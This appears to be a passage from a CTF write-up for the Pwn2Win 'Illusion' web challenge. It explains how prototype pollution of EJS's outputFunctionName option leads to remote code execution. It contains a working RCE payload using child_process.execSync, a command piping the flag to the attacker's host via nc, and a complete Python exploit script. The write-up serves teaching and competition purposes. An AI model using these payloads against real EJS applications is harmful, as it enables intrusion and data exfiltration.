<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">tryHandleCache</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">options</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">data</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">cb</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">promiseImpl</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">resolve</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">reject</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">      result </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">handleCache</span><span style="color: #F8F8F2">(options)(data);</span></span>
<span class="line"><span style="color: #F8F8F2">      </span><span style="color: #A6E22E">resolve</span><span style="color: #F8F8F2">(result);</span></span>
<span class="line"><span style="color: #F8F8F2">    });</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">handleCache</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">options</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">template</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">   </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">   func </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">(template, options);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">   </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">template</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">opts</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  templ </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Template</span><span style="color: #F8F8F2">(template, opts);</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> templ.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">();</span></span>
<span class="line"><span style="color: #F8F8F2">};</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">Template</span><span style="color: #F8F8F2">.prototype </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">if</span><span style="color: #F8F8F2"> (opts.outputFunctionName) {</span></span>
<span class="line"><span style="color: #F8F8F2">      prepended += </span><span style="color: #E6DB74">'  var '</span><span style="color: #F8F8F2"> + opts.outputFunctionName + </span><span style="color: #E6DB74">' = __append;'</span><span style="color: #F8F8F2"> + </span><span style="color: #E6DB74">'</span><span style="color: #AE81FF">\n</span><span style="color: #E6DB74">'</span><span style="color: #F8F8F2">;</span></span>
<span class="line"><span style="color: #F8F8F2">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    ...</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<p>In the line <code>44</code>, it is shown which property can exist and influence the compiling process. Thus, the execution flow of <code>ejs.renderFile</code> is:</p>
<ul>
<li>renderFile call.</li>
<li>tryHandleCache call.</li>
<li>handleCache call.</li>
<li>compile call.</li>
<li>Create a <code>Template</code> object and call its compiler.</li>
</ul>
<p>Now we need to use the Prototype Pollution to set the property <code>outputFunctionName</code> with a content to execute arbitrary OS command. One possible payload can be:
<code> "_; process.mainModule.require('child_process').execSync('&#x3C;OS command>');//</code>.</p>
<p>The content executed by the compiler will look like: <code>var _; process.mainModule.require('child_process').execSync('&#x3C;OS command>');// = __append;' + '\n</code></p>
<h2 id="getting-the-flag">Getting the flag</h2>
<p>To get the flag we need to remember all steps:</p>
<ul>
<li>Make a POST request to <code>change_status</code> to exploit Prototype Pollution to set the object property <code>outputFunctionName</code>.</li>
<li>Make a GET request to homepage to the app run <code>ejs.renderFile</code>.</li>
</ul>
<p>Remembering from the recon step, we can use the <code>readflag</code> binary to get the flag. Once the target server has <code>netcat</code> available, the command executed to receive the flag in our host can be: <code>./readflag | nc &#x3C;HOST> &#x3C;PORT> . </code></p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F92672">import</span><span style="color: #F8F8F2"> requests</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88846F"># Get user and password at "http://illusion.pwn2win.party:1337"</span></span>
<span class="line"></span>
<span class="line"><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"http://illusion.pwn2win.party:&#x3C;PORT instance>"</span></span>
<span class="line"><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
<span class="line"><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
<span class="line"></span>
<span class="line"><span style="color: #AE81FF">MY_HOST</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
<span class="line"><span style="color: #AE81FF">MY_PORT</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">requests.post(</span><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'/change_status'</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">json</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #E6DB74">"constructor/prototype/outputFunctionName"</span><span style="color: #F8F8F2">: </span><span style="color: #66D9EF">f</span><span style="color: #E6DB74">"_; process.mainModule.require('child_process').execSync('./readflag | nc </span><span style="color: #AE81FF">{MY_HOST}</span><span style="color: #E6DB74"> </span><span style="color: #AE81FF">{MY_PORT}</span><span style="color: #E6DB74">');//"</span></span>
<span class="line"><span style="color: #F8F8F2">    }, </span><span style="color: #FD971F">auth</span><span style="color: #F92672">=</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">requests.get(</span><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">auth</span><span style="color: #F92672">=</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2">))</span></span></code></pre>
<p>For the Python script above to execute correctly, it is necessary to make a proof of work connecting at <code> nc illusion.pwn2win.party 1337</code>. Then, you will receive an instance URL and the credentials to be able to make requests (remember the middleware from the recon step).</p>
<p>Now you only need to do some changes:</p>
<ul>
<li>TARGET_URL: instance URL.</li>
<li>USER: User provided by the proof of work.</li>
<li>PASSWORD: Password provided by the proof of work.</li>
<li>MY_HOST: Your host address to receive the connection.</li>
<li>MY_PORT: Your port to receive the connection.</li>
</ul>
<p><strong>Flag</strong>: <code>CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}</code></p>
<p>If you have some questions or considerations about this write-up, comment on the tweet below. Thank you!</p>
<h2 id="references">References</h2>
<ol>
<li><a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" target="_blank" rel="noopener noreferrer">Prototype pollution - The Daily Swig</a></li>
<li><a href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262" target="_blank" rel="noopener noreferrer">Prototype Pollution in fast-json-patch - Alejandro Romero (alromh87)</a>.</li>
<li><a href="https://blog.p6.is/AST-Injection/" target="_blank" rel="noopener noreferrer">AST Injection, Prototype Pollution to RCE - POSIXâ€™s blog</a>.</li>
<li><a href="https://pwn2.win/challenges/illusion" target="_blank" rel="noopener noreferrer">Illusion challenge - Pwn2Win</a></li>
</ol>
<hr>
<h2 id="discuss-on-twitter">Discuss on Twitter</h2>
<center>
<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="EffectRenan" data-color="#ffffff" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00"></script>
</center>
<blockquote align="center" class="twitter-tweet"><p lang="en" dir="ltr">I just post a write-up for the Illusion web challenge of <a href="https://twitter.com/Pwn2Win?ref_src=twsrc%5Etfw">@Pwn2Win</a>, trying to explain the prototype pollution and the AST injection. Check it out<a href="https://t.co/RHZf2SH3ZB">https://t.co/RHZf2SH3ZB</a><a href="https://twitter.com/hashtag/PrototypePollution?src=hash&#x26;ref_src=twsrc%5Etfw">#PrototypePollution</a> <a href="https://twitter.com/hashtag/RCE?src=hash&#x26;ref_src=twsrc%5Etfw">#RCE</a> <a href="https://twitter.com/hashtag/Pwn2Win?src=hash&#x26;ref_src=twsrc%5Etfw">#Pwn2Win</a> <a href="https://twitter.com/hashtag/CTF?src=hash&#x26;ref_src=twsrc%5Etfw">#CTF</a></p>â€” Renan Rocha (@EffectRenan) <a href="https://twitter.com/EffectRenan/status/1399146052595458067?ref_src=twsrc%5Etfw">May 30, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 
    </div>
  </body></html>